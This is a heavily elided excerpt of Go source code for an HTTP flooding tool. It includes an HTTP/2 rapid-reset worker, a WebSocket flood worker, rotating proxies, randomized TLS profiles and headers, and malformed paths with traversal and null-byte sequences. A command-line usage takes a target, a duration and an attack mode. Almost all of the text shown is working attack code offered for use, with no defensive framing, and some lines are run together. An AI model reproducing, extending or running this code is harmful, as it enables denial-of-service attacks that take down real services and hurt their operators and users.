...
func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter) {
	...
	for {
		...
		default:
			...
			// HTTP/2 connection preface			fmt.Fprintf(conn, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
			...
			for i := 0; i < 50; i++ {
				...
				default:
					...
					resetFrame[9] = 0
					resetFrame[10] = 0					resetFrame[11] = 0
...
// ADDED: WebSocket flood worker
func websocketWorker(targetURL string, done chan struct{}, stats *atomicCounter) {
	...
	for {
		...
		default:
			...
			go func(c *websocket.Conn, doneChan chan struct{}) {
				ticker := time.NewTicker(time.Duration(randInt(1, 5)) * time.Second)
				defer ticker.Stop()
				for {
					select {					case <-doneChan:
						c.Close()
						return
					case <-ticker.C:
						msg := randomString(randInt(32, 256))
			...
			// Keep connection alive briefly before closing (simulate real client churn)
...
func proxyRefresher() {	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
...
func generateAdvancedPath() string {
	...
	if randInt(1, 100) <= 20 {
		malforms := []string{
			...
			"/./" + randomString(6) + "/..",
			"//" + randomString(8),
			"/%2e%2e%2f" + randomString(4),			"/" + randomString(4) + "%00" + randomString(4),
		}
...
func main() {
	...
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: go run main.go <target> <seconds> <GET|POST|HEAD|SLOW|WS> [proxy]")
	...
	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" && mode != "WS" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, SLOW, or WS")
		os.Exit(1)
	}

	u, err := url.Parse(target)
	if err != nil || u.Scheme == "" || u.Host == "" {		if strings.Contains(target, ":") && !strings.Contains(target, "://") {
			target = "http://" + target
	...
	if mode == "WS" {
		fmt.Printf("[+] Launching WebSocket flood with %d workers\n", workers)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				websocketWorker(target, done, stats)
			}(i)
		}
	} else if h2Supported && mode == "GET" {
...
func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	...
	if client == nil {		tr := &http.Transport{
			TLSClientConfig:     getRandomTLSProfile(), // CHANGED: Use randomized TLS profile
			MaxIdleConns:        4000,
			MaxIdleConnsPerHost: 2000,
			IdleConnTimeout:     120 * time.Second,
	...
	for {
		...
		default:
			...
			// Accept headers			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			...
			if provider == "digitalocean" && randBool() {
				for _, h := range digitaloceanHeaders {					for k, v := range h {
